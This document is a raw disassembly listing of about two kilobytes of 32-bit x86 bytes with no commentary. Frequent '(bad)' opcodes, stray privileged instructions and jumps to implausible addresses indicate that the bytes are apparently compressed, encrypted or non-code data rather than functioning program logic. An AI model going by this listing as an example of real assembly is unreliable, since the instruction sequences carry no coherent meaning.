  42041d:	push   es
  42041e:	popf   
  42041f:	jmp    ebp
  420421:	data16 add al,0x51
  420424:	ds dec esi
  420426:	stos   DWORD PTR es:[edi],eax
  420427:	stos   DWORD PTR es:[edi],eax
  420428:	and    eax,0x47a47117
  42042d:	lock out 0x8f,eax
  420430:	in     al,0x95
  420432:	push   ecx
  420433:	je     0x4203db
  420435:	(bad)  ds:0x5f4a3350
  42043b:	sti    
  42043c:	nop
  42043d:	repz into 
  42043f:	cli    
  420440:	and    al,BYTE PTR [edi]
  420442:	mov    DWORD PTR [ecx-0x769340e2],edx
  420448:	rol    DWORD PTR es:0xf28401a6,cl
  42044f:	stos   BYTE PTR es:[edi],al
  420450:	addr16 std 
  420452:	ds pop esp
  420454:	ss jg  0x420481
  420457:	sbb    al,dh
  420459:	jg     0x42046a
  42045b:	cwde   
  42045c:	push   ss
  42045d:	dec    edi
  42045e:	shr    BYTE PTR [edi],1
  420460:	and    BYTE PTR [edx-0x6cb717c5],0xcb
  420467:	mov    ebp,0xad4a1a54
  42046c:	cmp    ecx,edx
  42046e:	xor    ah,dh
  420470:	ins    DWORD PTR es:[edi],dx
  420471:	sbb    DWORD PTR [edi+esi*4+0x74],ecx
  420475:	aaa    
  420476:	mov    esp,DWORD PTR [ecx]
  420478:	inc    ebx
  420479:	adc    al,0x63
  42047b:	jmp    0xab81b1ab
  420480:	jge    0x42047a
  420482:	push   eax
  420483:	lods   eax,DWORD PTR ds:[esi]
  420484:	std    
  420485:	loopne 0x420413
  420487:	shl    BYTE PTR [edi-0x153e0924],1
  42048d:	mov    ds:0xfe1ca76f,eax
  420492:	xchg   BYTE PTR [esp+ecx*2-0x27fd8859],dh
  420499:	pop    ds
  42049a:	or     eax,edx
  42049c:	(bad)  
  42049d:	sbb    BYTE PTR [ebx-0x7deb360d],dl
  4204a3:	xchg   edi,eax
  4204a4:	sbb    BYTE PTR [edx+0x67],bh
  4204a7:	sub    eax,0xe7caffe6
  4204ac:	es in  al,0xd8
  4204af:	test   BYTE PTR [edi-0x37],al
  4204b2:	pop    ebp
  4204b3:	or     BYTE PTR [esi-0x2d],0xfe
  4204b7:	loop   0x420531
  4204b9:	repnz mov al,0x4b
  4204bc:	js     0x4204bf
  4204be:	into   
  4204bf:	lods   eax,DWORD PTR ds:[esi]
  4204c0:	mov    ecx,0x266c049c
  4204c5:	pop    edi
  4204c6:	push   0xffffffe3
  4204c8:	cdq    
  4204c9:	sub    eax,0x66b015dd
  4204ce:	xchg   ebp,eax
  4204cf:	cwde   
  4204d0:	push   0xffffff9a
  4204d2:	add    ecx,0xe8f90a30
  4204d8:	cli    
  4204d9:	mov    edx,DWORD PTR fs:[edx-0x3e]
  4204dd:	test   BYTE PTR [ebx+0x31],ah
  4204e0:	fwait
  4204e1:	xchg   ebx,eax
  4204e2:	dec    esi
  4204e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204e4:	add    eax,0x2858191f
  4204e9:	dec    ebx
  4204ea:	push   eax
  4204eb:	fdivr  QWORD PTR [ecx]
  4204ed:	das    
  4204ee:	fs rol cl,1
  4204f1:	push   ecx
  4204f2:	add    BYTE PTR [ebx+ebp*8-0x1b],ah
  4204f6:	stos   DWORD PTR es:[edi],eax
  4204f7:	mov    bl,0x8a
  4204f9:	loope  0x42054a
  4204fb:	pop    edx
  4204fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204fd:	ret    
  4204fe:	call   FWORD PTR [ecx+0x77]
  420501:	mov    al,0xc8
  420503:	int3   
  420504:	sbb    BYTE PTR [ebx+0x18],dh
  420507:	jne    0x42053b
  420509:	push   ebx
  42050a:	fsubr  QWORD PTR [ebx]
  42050c:	mov    esi,0x19f0bb21
  420511:	push   edx
  420512:	cdq    
  420513:	pop    ecx
  420514:	mov    ebx,DWORD PTR [ebp+ebx*1+0x290fa87]
  42051b:	pop    ebp
  42051c:	pusha  
  42051d:	pusha  
  42051e:	jne    0x420587
  420520:	lea    edx,[ebp+0x3a]
  420523:	loop   0x420593
  420525:	aam    0x7f
  420527:	xor    DWORD PTR [eax],0xbd55d392
  42052d:	aam    0xac
  42052f:	cld    
  420530:	inc    eax
  420531:	sub    eax,0x320909b4
  420536:	pop    edx
  420537:	je     0x42050f
  420539:	dec    ebp
  42053a:	idiv   edx
  42053c:	hlt    
  42053d:	fsubp  st(7),st
  42053f:	adc    al,0x1a
  420541:	sti    
  420542:	sbb    al,0x90
  420544:	xchg   esp,eax
  420545:	ins    DWORD PTR es:[edi],dx
  420546:	push   eax
  420547:	add    al,0xae
  420549:	jo     0x4205c8
  42054b:	jnp    0x420573
  42054d:	sbb    ebx,DWORD PTR [edi]
  42054f:	push   edi
  420550:	push   ecx
  420551:	int3   
  420552:	fs dec ebp
  420554:	icebp  
  420555:	fsubr  QWORD PTR [edx+edx*2+0x1baa81b5]
  42055c:	pop    es
  42055d:	push   ebx
  42055e:	cmp    eax,0xa9e73afd
  420563:	cwde   
  420564:	jl     0x42053f
  420566:	les    eax,FWORD PTR [ebp-0x17]
  420569:	add    dh,ch
  42056b:	push   esp
  42056c:	dec    di
  42056e:	mov    al,ds:0xa4b74c20
  420573:	cmp    eax,0x699a060
  420578:	(bad)  
  420579:	dec    dh
  42057b:	pop    edx
  42057c:	or     eax,0x34a54769
  420581:	or     al,0x74
  420583:	jecxz  0x42052f
  420585:	dec    edx
  420586:	jae    0x4205be
  420588:	xor    DWORD PTR [edx-0x21],esp
  42058b:	push   ebp
  42058c:	test   eax,0x89907f5c
  420591:	shl    DWORD PTR [edi+0x5b],1
  420594:	add    DWORD PTR [edi],edx
  420596:	dec    ebx
  420597:	sub    al,0x33
  420599:	sbb    eax,0x70159700
  42059e:	in     eax,0x6c
  4205a0:	jl     0x4205e9
  4205a2:	push   ecx
  4205a3:	scas   al,BYTE PTR es:[edi]
  4205a4:	adc    al,ch
  4205a6:	ins    DWORD PTR es:[edi],dx
  4205a7:	into   
  4205a8:	push   ebp
  4205a9:	fcmovu st,st(3)
  4205ab:	mov    al,0xdc
  4205ad:	cmp    edi,DWORD PTR [esi-0x26]
  4205b0:	cmp    BYTE PTR [eax+0x4],dh
  4205b3:	sub    eax,0x27028770
  4205b8:	pop    eax
  4205b9:	xchg   edi,eax
  4205ba:	xor    eax,DWORD PTR [ebp+0x66]
  4205bd:	dec    ebx
  4205be:	sub    esi,eax
  4205c0:	(bad)  
  4205c2:	push   es
  4205c3:	in     al,0xf6
  4205c5:	lahf   
  4205c6:	adc    al,BYTE PTR ds:0xbdf6e714
  4205cc:	inc    ebx
  4205cd:	sub    edi,DWORD PTR [eax+0x6c31ab1b]
  4205d3:	xchg   ebp,eax
  4205d4:	rcr    BYTE PTR [ebx],1
  4205d6:	push   ds
  4205d7:	cmp    eax,DWORD PTR [ecx-0x16]
  4205da:	inc    edx
  4205db:	sbb    ah,ah
  4205dd:	clc    
  4205de:	and    ebp,DWORD PTR [ecx-0x45]
  4205e1:	push   ecx
  4205e2:	sub    BYTE PTR [ebp-0x27],ah
  4205e5:	pop    ss
  4205e6:	imul   eax,ecx,0xcd226d12
  4205ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205ed:	xchg   DWORD PTR [eax-0x2b],eax
  4205f0:	ss clc 
  4205f2:	adc    eax,0x63348ccb
  4205f7:	ja     0x420620
  4205f9:	sbb    DWORD PTR [ebx],0x55d81059
  4205ff:	sub    al,BYTE PTR [ecx+0x47caafef]
  420605:	jmp    0x4205c9
  420607:	ret    
  420608:	sub    ecx,DWORD PTR [esi-0x66e9199f]
  42060e:	xchg   BYTE PTR [eax],bl
  420610:	or     ebp,DWORD PTR [eax+0x66]
  420613:	push   esi
  420614:	fdivrp st(6),st
  420616:	mov    eax,0xe8f070bb
  42061b:	in     eax,0x17
  42061d:	fcmove st,st(1)
  42061f:	ret    0x91e4
  420622:	add    ch,BYTE PTR [esi]
  420624:	mov    esp,0x4ef362f4
  420629:	push   ecx
  42062a:	add    al,0x78
  42062c:	ins    BYTE PTR es:[edi],dx
  42062d:	bnd call 0x5ab17ed9
  420633:	mov    bh,BYTE PTR [esi+0xf]
  420636:	mov    ah,0x64
  420638:	xchg   BYTE PTR [edi],dh
  42063a:	fsub   st(2),st
  42063c:	in     al,dx
  42063d:	lds    esp,FWORD PTR [edi]
  42063f:	dec    ebp
  420640:	test   DWORD PTR [ecx-0x2f8fa039],ebx
  420646:	xlat   BYTE PTR ds:[ebx]
  420647:	jbe    0x42067a
  420649:	fsub   DWORD PTR [eax-0x4fe628c5]
  42064f:	int3   
  420650:	call   0x92676e08
  420655:	sub    ch,ch
  420657:	adc    DWORD PTR [edx-0x798a1e0c],esi
  42065d:	mov    ebx,0x5f3a7090
  420662:	dec    ebp
  420663:	cmp    eax,0xf2293ba1
  420668:	(bad)  
  420669:	and    bh,al
  42066b:	pop    ebp
  42066c:	adc    DWORD PTR [ebp+0x56],ecx
  42066f:	addr16 push esp
  420671:	mov    ds:0xa3049b87,eax
  420676:	fwait
  420677:	and    al,BYTE PTR [ebx+0x7b]
  42067a:	mov    bl,0x44
  42067c:	imul   esi,DWORD PTR [edx+0x31],0x73
  420680:	or     BYTE PTR [esi],cl
  420682:	pop    edi
  420683:	push   edx
  420684:	outs   dx,BYTE PTR ds:[esi]
  420685:	mov    edx,0x3869344e
  42068a:	dec    ebp
  42068b:	test   eax,0xd40966c7
  420690:	popa   
  420691:	xchg   ebp,eax
  420692:	sti    
  420693:	repz add bh,BYTE PTR ds:[ebx]
  420697:	hlt    
  420698:	sub    edi,edi
  42069a:	aas    
  42069b:	jmp    0xf9e84065
  4206a0:	addr16 adc ch,0x68
  4206a4:	push   ebx
  4206a5:	repz xor al,0xcc
  4206a8:	push   0x3d
  4206aa:	ret    
  4206ab:	nop
  4206ac:	cmp    al,0xf2
  4206ae:	mov    ecx,DWORD PTR gs:[esi-0x3]
  4206b2:	pop    ds
  4206b3:	mov    edi,0x3a79e66b
  4206b8:	test   DWORD PTR [ebp+0x7c5ec5b6],esp
  4206be:	fwait
  4206bf:	nop
  4206c0:	loop   0x4206df
  4206c2:	jns    0x420685
  4206c4:	push   edx
  4206c5:	push   edx
  4206c6:	and    ebp,eax
  4206c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c9:	inc    edx
  4206ca:	retf   0x2325
  4206cd:	aaa    
  4206ce:	aaa    
  4206cf:	fstp   QWORD PTR [edx+0x5481c8b2]
  4206d5:	inc    ebp
  4206d6:	ds mov esi,esi
  4206d9:	xchg   ebx,eax
  4206da:	(bad)  
  4206db:	(bad)  
  4206dc:	push   eax
  4206dd:	pop    ss
  4206de:	jnp    0x420707
  4206e0:	inc    BYTE PTR [edx-0x4f03d8a6]
  4206e6:	mov    WORD PTR [eax+0x78],?
  4206e9:	xor    edx,DWORD PTR [ecx]
  4206eb:	frstor [edi]
  4206ed:	les    ecx,FWORD PTR [ebp-0x5f88ffd]
  4206f3:	(bad)  
  4206f4:	mov    esp,0x1b5c1a42
  4206f9:	mov    ah,0xcf
  4206fb:	push   ds
  4206fc:	test   eax,0xd5bce3b9
  420701:	or     eax,0xd162e931
  420706:	and    al,0xb4
  420708:	loop   0x420774
  42070a:	or     esi,DWORD PTR [esp+edx*1+0x55]
  42070e:	mov    bh,0x9b
  420710:	mov    ah,0x77
  420712:	(bad)  
  420713:	out    0xba,eax
  420715:	lock cmp al,0x68
  420718:	push   ebp
  420719:	hlt    
  42071a:	shr    esp,1
  42071c:	mov    eax,0x2b24d1e0
  420721:	xor    eax,DWORD PTR [esi]
  420723:	fs and eax,0xac942972
  420729:	xchg   edx,eax
  42072a:	retf   
  42072b:	mov    WORD PTR [ebp-0x6f],ds
  42072e:	(bad)  
  42072f:	or     al,bl
  420731:	pop    edx
  420732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420733:	cmp    eax,0xfc36c2ae
  420738:	push   ebp
  420739:	or     bl,BYTE PTR [edx+0x3deffae1]
  42073f:	in     al,0xa2
  420741:	or     BYTE PTR [edx-0x76c6d997],ch
  420747:	xchg   edx,eax
  420748:	mov    dh,0x3b
  42074a:	jp     0x42079b
  42074c:	push   eax
  42074d:	xchg   ebx,eax
  42074e:	pusha  
  42074f:	cmp    eax,0x83aedaff
  420754:	sbb    al,0x16
  420756:	push   esp
  420757:	idiv   dl
  420759:	sbb    DWORD PTR [edi],esp
  42075b:	adc    dh,BYTE PTR ds:0x929e88a9
  420761:	out    0x44,al
  420763:	or     DWORD PTR [esi],esp
  420765:	ret    
  420766:	push   0xc
  420768:	cmp    cl,BYTE PTR [ebx]
  42076a:	pop    eax
  42076b:	test   eax,0x38ea7e88
  420770:	fimul  WORD PTR [esi-0x7d]
  420773:	int    0xcd
  420775:	mov    bh,0x94
  420777:	imul   edi,DWORD PTR [esi],0x72a9e10a
  42077d:	xchg   edx,eax
  42077e:	push   cs
  42077f:	je     0x420751
  420781:	adc    al,0x68
  420783:	mov    ebx,DWORD PTR [ebp+0x1df4748d]
  420789:	and    al,0x71
  42078b:	aam    0x39
  42078d:	mov    dl,0xb4
  42078f:	mov    bh,0xb
  420791:	mov    al,ds:0xbc8ec076
  420796:	aas    
  420797:	cli    
  420798:	sti    
  420799:	pop    ebx
  42079a:	int    0xf
  42079c:	push   esi
  42079d:	mov    ah,0xa8
  42079f:	pop    ebx
  4207a0:	sbb    eax,0x5d31535
  4207a5:	push   ds
  4207a6:	cmp    al,0x23
  4207a8:	fist   DWORD PTR [ecx+eiz*4-0x346b892d]
  4207af:	and    dh,dh
  4207b1:	adc    BYTE PTR [edi+0x15],0x29
  4207b5:	adc    BYTE PTR [ecx+0x3dad655b],bl
  4207bb:	cmp    DWORD PTR [edi+eax*1+0x5e],eax
  4207bf:	adc    ecx,DWORD PTR [ebx-0x7ebd9864]
  4207c5:	(bad)  
  4207c6:	pop    ebp
  4207c7:	mov    ebx,0xd254b5a3
  4207cc:	cvtpi2ps xmm5,QWORD PTR [edx]
  4207cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d0:	dec    ebp
  4207d1:	mov    bh,0xc7
  4207d3:	adc    dl,bl
  4207d5:	loope  0x420848
  4207d7:	arpl   WORD PTR [edi],cx
  4207d9:	push   0x504e375f
  4207de:	cmp    al,0xd1
  4207e0:	and    al,0xb0
  4207e2:	mov    ch,0xb9
  4207e4:	push   ecx
  4207e5:	out    0x70,eax
  4207e7:	mov    dh,0x6d
  4207e9:	push   es
  4207ea:	xchg   eax,edx
  4207ec:	pusha  
  4207ed:	int3   
  4207ee:	add    BYTE PTR [edi-0x71],ah
  4207f1:	aam    0x9d
  4207f3:	xchg   edx,eax
  4207f4:	pop    ss
  4207f5:	cmp    esi,DWORD PTR [eax]
  4207f7:	lahf   
  4207f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207f9:	stos   BYTE PTR es:[edi],al
  4207fa:	add    DWORD PTR [edi-0x3d3d7eb5],ebp
  420800:	(bad)  
  420801:	scas   al,BYTE PTR es:[edi]
  420802:	ins    DWORD PTR es:[edi],dx
  420803:	aad    0xd7
  420805:	retf   
  420806:	out    0x6b,eax
  420808:	and    esp,esp
  42080a:	daa    
  42080b:	adc    al,0x3e
  42080d:	clc    
  42080e:	popf   
  42080f:	repnz lea esp,ds:[eax+0x593d22ed]
  420817:	retf   0xc470
  42081a:	mov    cl,0xfe
  42081c:	push   cs
  42081d:	fst    st(7)
  42081f:	mov    edx,0xc04f24ac
  420824:	loope  0x420843
  420826:	xchg   edx,eax
  420827:	popa   
  420828:	idiv   BYTE PTR [eax-0x3d]
  42082b:	mov    dl,BYTE PTR [ebx+edx*8+0x4abdcebc]
  420832:	push   ebx
  420833:	xchg   esp,eax
  420834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420835:	mov    edx,0xc3f81b26
  42083a:	addr16 daa 
  42083c:	dec    edx
  42083d:	sti    
  42083e:	xchg   ecx,eax
  42083f:	xchg   edi,eax
  420840:	(bad)  
  420841:	ins    DWORD PTR es:[edi],dx
  420842:	stos   BYTE PTR es:[edi],al
  420843:	add    bl,BYTE PTR [ecx+0x3]
  420846:	rol    edx,0xb
  420849:	mov    dh,0xaa
  42084b:	(bad)  
  42084c:	push   esi
  42084d:	pop    ds
  42084e:	test   eax,0xf935ff4b
  420853:	shl    esp,1
  420855:	mov    edi,0x69434cc7
  42085a:	pop    ecx
  42085b:	mov    edi,0x93ae66d7
  420860:	aad    0x1d
  420862:	sar    BYTE PTR [ebx],1
  420864:	iret   
  420865:	jae    0x4208a6
  420867:	(bad)  
  420868:	lock cs nop
  42086b:	out    dx,eax
  42086c:	(bad)
  42086f:	cmp    DWORD PTR [eax+0x70],edx
  420872:	push   ss
  420873:	inc    edx
  420874:	push   0xb11423e5
  420879:	xor    eax,0x69a52f69
  42087e:	sbb    DWORD PTR [eax+0x59c164b3],esp
  420884:	and    bl,BYTE PTR [eax]
  420886:	and    edi,DWORD PTR [edx+0x28]
  420889:	push   ss
  42088a:	outs   dx,DWORD PTR ds:[esi]
  42088b:	inc    ecx
  42088c:	push   es
  42088d:	pop    ecx
  42088e:	pop    ss
  42088f:	mov    ebp,0xc58766d2
  420894:	pop    es
  420895:	xor    al,0x48
  420897:	mov    bh,BYTE PTR [edi]
  420899:	jmp    0xe036:0x1a6e2d4b
  4208a0:	add    eax,ebx
  4208a2:	iret   
  4208a3:	imul   edi,DWORD PTR [ecx+eax*4],0x6a
  4208a7:	add    al,0xdc
  4208a9:	push   ss
  4208aa:	cmp    eax,0xbb4a89f
  4208af:	cs test eax,0xbf326b5f
  4208b5:	lods   eax,DWORD PTR ds:[esi]
  4208b6:	es retf 
  4208b8:	es jl  0x4778f7bf
  4208bf:	test   DWORD PTR [eax+0x77],ecx
  4208c2:	push   0x1036060
  4208c7:	sub    bh,BYTE PTR [eax]
  4208c9:	mov    ss:0xa6347dc8,eax
  4208cf:	rcl    DWORD PTR [esi+0x3a71e7fb],cl
  4208d5:	mov    bh,0x1e
  4208d7:	and    BYTE PTR [eax+0x25],bh
  4208da:	sub    eax,0x59a87c6c
  4208df:	mov    ds:0x5411adc9,al
  4208e4:	lods   al,BYTE PTR ds:[esi]
  4208e5:	or     edx,esp
  4208e7:	push   edx
  4208e8:	inc    edi
  4208e9:	test   al,0x1c
  4208eb:	mov    dl,0x8f
  4208ed:	jo     0x4208be
  4208ef:	in     al,dx
  4208f0:	outs   dx,BYTE PTR ds:[esi]
  4208f1:	mov    dh,BYTE PTR [ebp+0x60]
  4208f4:	mov    edx,ebx
  4208f6:	lds    esp,FWORD PTR [esi+0x6547f3a]
  4208fc:	mov    ds:0x859390e5,al
  420902:	rcr    DWORD PTR [esi+ecx*1-0x61],1
  420906:	popf   
  420907:	xchg   edx,eax
  420908:	jo     0x4208f0
  42090a:	cmp    esi,DWORD PTR [eax+ebp*8+0x76]
  42090e:	jno    0x420904
  420910:	fnsave [ebp+0x79cb066]
  420916:	scas   al,BYTE PTR es:[edi]
  420917:	or     ebx,ebx
  420919:	aad    0x9
  42091b:	dec    edx
  42091c:	cs scas eax,DWORD PTR es:[edi]
  42091e:	into   
  42091f:	pop    ds
  420920:	(bad)  
  420922:	mov    ch,ch
  420924:	retf   0x5ff6
  420927:	jl     0x4208d4
  420929:	out    0x35,al
  42092b:	das    
  42092c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42092d:	or     BYTE PTR [ebx-0x6b],dl
  420930:	ror    ebp,0x9c
  420933:	je     0x42098a
  420935:	cmp    al,0xda
  420937:	push   ebp
  420938:	push   0xffffffbb
  42093a:	jae    0x4209a9
  42093c:	lods   al,BYTE PTR ds:[esi]
  42093d:	inc    ebp
  42093e:	xchg   ecx,eax
  42093f:	mov    ds:0x21396763,eax
  420944:	inc    edi
  420945:	mov    DWORD PTR [edx],ecx
  420947:	gs mov ebp,eax
  42094a:	sbb    cl,BYTE PTR [ebx+ebp*2+0x64]
  42094e:	dec    eax
  42094f:	or     edi,0x33110286
  420955:	je     0x420947
  420957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420958:	mov    ds:0x89080cf8,eax
  42095d:	jne    0x420999
  42095f:	pop    ebp
  420960:	fstp   TBYTE PTR [edx]
  420962:	outs   dx,BYTE PTR ds:[esi]
  420963:	loopne 0x4209d3
  420965:	mov    ebx,0x974ef6d2
  42096a:	jp     0x4209ae
  42096c:	shl    eax,1
  42096e:	mov    edi,0x40644b06
  420973:	mov    BYTE PTR [ebx-0x1a],bl
  420976:	ret    
  420977:	xchg   edi,eax
  420978:	and    eax,0x8d72a992
  42097d:	pop    edx
  42097e:	dec    edi
  42097f:	bound  ebx,QWORD PTR [eax+0x78849eb7]
  420985:	dec    ecx
  420986:	sahf   
  420987:	sbb    eax,0x48494b82
  42098c:	sub    edx,ebp
  42098e:	retf   0xadf
  420991:	cli    
  420992:	inc    edi
  420993:	adc    BYTE PTR [eax+0x35],ah
  420996:	stos   BYTE PTR es:[edi],al
  420997:	adc    DWORD PTR [edx],edi
  420999:	adc    al,0x1c
  42099b:	shl    ebp,cl
  42099d:	push   ecx
  42099e:	push   edi
  42099f:	xchg   ebx,eax
  4209a0:	mov    dl,BYTE PTR [ebx+0x2]
  4209a3:	test   BYTE PTR [eax+0x3d],0xa6
  4209a7:	int3   
  4209a8:	jg     0x420986
  4209aa:	js     0x4209a5
  4209ac:	cmp    esp,DWORD PTR [eax+0x64c49cb8]
  4209b2:	dec    edx
  4209b3:	xlat   BYTE PTR ds:[ebx]
  4209b4:	gs aaa 
  4209b6:	jbe    0x4209d0
  4209b8:	xor    al,0x6a
  4209ba:	out    0x9d,al
  4209bc:	outs   dx,DWORD PTR ds:[esi]
  4209bd:	mov    ebx,0x10e93e5
  4209c2:	loope  0x420973
  4209c4:	push   0x3b9c3766
  4209c9:	adc    eax,0xd54bd6a
  4209ce:	mov    ds:0x6f95d77,al
  4209d3:	(bad)  
  4209d4:	mov    esp,0xa5ac1852
  4209d9:	push   esp
  4209da:	inc    esp
  4209db:	(bad)  
  4209dd:	mov    ah,0x81
  4209df:	adc    eax,esi
  4209e1:	cmp    esi,DWORD PTR [esi-0x6a]
  4209e4:	lea    esi,[esi-0x30597268]
  4209ea:	pop    ds
  4209eb:	(bad)  
  4209ec:	in     al,dx
  4209ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ee:	sub    bl,dh
  4209f0:	mov    bl,0x4f
  4209f2:	cmp    edx,edi
  4209f4:	sahf   
  4209f5:	and    dh,bl
  4209f7:	sar    BYTE PTR [ebp+0x7a9157f9],1
  4209fd:	xor    al,0xc1
  4209ff:	cwde   
  420a00:	sbb    eax,DWORD PTR [edi*8+0xce51ed1]
  420a07:	mov    ds:0x9a964af4,al
  420a0c:	cmp    edx,edx
  420a0e:	repz out dx,al
  420a10:	out    0x81,eax
  420a12:	xchg   edx,eax
  420a13:	sub    DWORD PTR [eax+0x17],esi
  420a16:	mov    ch,0xe3
  420a18:	(bad)  
  420a19:	iret   
  420a1a:	repz in eax,0xf5
  420a1d:	enter  0x1741,0x85
  420a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a22:	enter  0xfae5,0x72
  420a26:	retf   0xe0c8
  420a29:	loop   0x4209b5
  420a2b:	push   0xdaf9693e
  420a30:	jp     0x420a5e
  420a32:	or     dh,bh
  420a34:	cmp    DWORD PTR [ebp-0x43f1a467],0x15
  420a3b:	mov    bl,bl
  420a3d:	sbb    dl,BYTE PTR [edx+0x22399089]
  420a43:	add    esp,DWORD PTR [ebx+0x7ff7038]
  420a49:	pop    edx
  420a4a:	aas    
  420a4b:	fwait
  420a4c:	in     al,dx
  420a4d:	lahf   
  420a4e:	xchg   edi,eax
  420a4f:	aas    
  420a50:	out    0xfe,al
  420a52:	adc    al,0x3
  420a54:	retf   
  420a55:	dec    ebp
  420a56:	sahf   
  420a57:	xchg   dh,dh
  420a59:	das    
  420a5a:	jno    0x420ac6
  420a5c:	jle    0x420a4e
  420a5e:	test   al,0x5c
  420a60:	rol    BYTE PTR [edx-0x14],0x65
  420a64:	scas   eax,DWORD PTR es:[edi]
  420a65:	sbb    al,0x1d
  420a67:	js     0x420aab
  420a69:	lahf   
  420a6a:	xchg   ecx,eax
  420a6b:	cld    
  420a6c:	fsub   DWORD PTR [edi+edx*1]
  420a6f:	out    0x22,al
  420a71:	or     edx,DWORD PTR [edx-0x2db3a051]
  420a77:	shr    BYTE PTR ds:0x955027a6,0x61
  420a7e:	fs push ebp
  420a80:	out    0x39,al
  420a82:	mov    ebp,0x662ccf8b
  420a87:	jns    0x420a93
  420a89:	push   ebx
  420a8a:	pop    es
  420a8b:	shl    BYTE PTR [edx+0x7c],cl
  420a8e:	fistp  WORD PTR [eax]
  420a90:	mov    ds:0x81d847f7,eax
  420a95:	cli    
  420a96:	test   BYTE PTR [ebx],bh
  420a98:	sbb    edi,DWORD PTR [edi]
  420a9a:	cwde   
  420a9b:	mov    ecx,0x57aab52e
  420aa0:	(bad)  
  420aa1:	sub    DWORD PTR [ecx-0x66bd98fd],esp
  420aa7:	or     edi,edi
  420aa9:	jg     0x420ae7
  420aab:	and    esi,DWORD PTR [eax]
  420aad:	mov    bl,0x16
  420aaf:	sbb    eax,0x2f6029e2
  420ab4:	sti    
  420ab5:	cmp    DWORD PTR [edx],ecx
  420ab7:	and    BYTE PTR [eax+0x20],ah
  420aba:	cmp    DWORD PTR [esi-0x31f1a9a8],0x32c4d4dd
  420ac4:	mov    dl,0xbb
  420ac6:	shr    BYTE PTR [eax],1
  420ac8:	adc    bl,ch
  420aca:	sbb    DWORD PTR [eax],0xffffffbc
  420acd:	test   eax,0xc9a6e70
  420ad2:	xchg   edi,eax
  420ad3:	popa   
  420ad4:	xchg   esp,eax
  420ad5:	adc    BYTE PTR [ecx+0x5f7aa48b],bl
  420adb:	or     al,0x22
  420add:	adc    eax,0xe33030e
  420ae2:	int    0xd2
  420ae4:	iret   
  420ae5:	ds push ss
  420ae7:	mov    eax,ds:0xaa3ea23c
  420aec:	and    edx,edx
  420aee:	mov    bh,0x4a
  420af0:	shl    BYTE PTR [ecx-0x45],0x3e
  420af4:	arpl   WORD PTR [bx],si
  420af7:	cmp    al,0x83
  420af9:	outs   dx,DWORD PTR ds:[esi]
  420afa:	push   ebp
  420afb:	inc    esp
  420afc:	call   0x2aab2409
  420b01:	push   es
  420b02:	(bad)  
  420b03:	outs   dx,BYTE PTR ds:[esi]
  420b04:	cwde   
  420b05:	fs inc esp
  420b07:	mov    al,ds:0xcae8134d
  420b0c:	(bad)  
  420b0e:	adc    ah,BYTE PTR [esi]
  420b10:	aas    
  420b11:	out    dx,eax
  420b12:	jecxz  0x420b24
  420b14:	adc    eax,0xfdc0ca50
  420b19:	out    0x73,al
  420b1b:	fcomp  QWORD PTR [edi+0x59]
  420b1e:	daa    
  420b1f:	cs pop ds
  420b21:	iret   
  420b22:	pop    es
  420b23:	pop    edi
  420b24:	shl    edx,0xd3
  420b27:	into   
  420b28:	sub    al,BYTE PTR ds:0xc25fa98
  420b2e:	xor    esp,edx
  420b30:	or     bl,BYTE PTR [esi+0x3]
  420b33:	adc    BYTE PTR [ebx-0x1174a08a],0x64
  420b3a:	dec    eax
  420b3b:	cmc    
  420b3c:	and    ch,al
  420b3e:	test   eax,0x15b04f2c
  420b43:	mov    bh,0x2c
  420b45:	push   ds
  420b46:	pop    es
  420b47:	push   0x15
  420b49:	xchg   esp,eax
  420b4a:	cmp    eax,0x2234220e
  420b4f:	jno    0x420b81
  420b51:	loope  0x420b6e
  420b53:	aam    0x76
  420b55:	mov    al,0x5b
  420b57:	xor    DWORD PTR [edi+0x4ee7d3d8],ecx
  420b5d:	xchg   BYTE PTR [ebp+0x4c],ah
  420b60:	aad    0x8c
  420b62:	pop    esp
  420b63:	mov    esp,eax
  420b65:	sbb    ch,BYTE PTR [eax+0x7fcf16c4]
  420b6b:	sbb    al,dh
  420b6d:	sbb    al,0x71
  420b6f:	dec    ebp
  420b70:	sub    al,0x6b
  420b72:	arpl   WORD PTR [ecx+eax*2+0x24],bp
  420b76:	xlat   BYTE PTR ds:[ebx]
  420b77:	dec    ebp
  420b78:	inc    ebx
  420b79:	pop    edx
  420b7a:	or     BYTE PTR [edx-0x6f],bh
  420b7d:	ins    BYTE PTR es:[edi],dx
  420b7e:	pushf  
  420b7f:	loope  0x420bf1
  420b81:	scas   al,BYTE PTR es:[edi]
  420b82:	mov    ebx,0x93f7a9f6
  420b87:	sbb    BYTE PTR [ecx-0x75],bl
  420b8a:	fld    TBYTE PTR [esp+ebp*8+0x73]
  420b8e:	cmc    
  420b8f:	scas   al,BYTE PTR es:[edi]
  420b90:	mov    bh,BYTE PTR ds:0xf5d02807
  420b96:	and    al,0x8
  420b98:	mov    al,ds:0x9d1ed7f4
  420b9d:	mov    cl,0x5f
  420b9f:	hlt    
  420ba0:	push   es
  420ba1:	aaa    
  420ba2:	pop    ecx
  420ba3:	mov    eax,0x29ea881a
  420ba8:	pushf  
  420ba9:	mov    dh,BYTE PTR [eax-0x2d]
  420bac:	test   al,dh
  420bae:	(bad)  
  420baf:	dec    edx
  420bb0:	pop    ds
  420bb1:	std    
  420bb2:	aas    
  420bb3:	or     al,dl
  420bb5:	sub    al,0x54
  420bb7:	into   
  420bb8:	outs   dx,DWORD PTR ds:[esi]
  420bb9:	or     eax,0x46f34e8b
  420bbe:	jns    0x420c06
  420bc0:	adc    dl,BYTE PTR [di-0x3930]
  420bc5:	mov    ah,0x49
  420bc7:	lds    eax,FWORD PTR [edi]
  420bc9:	popw   ss
  420bcb:	cmp    ah,dl
  420bcd:	popa   
  420bce:	adc    al,0x54
  420bd0:	es ret 0x6b32
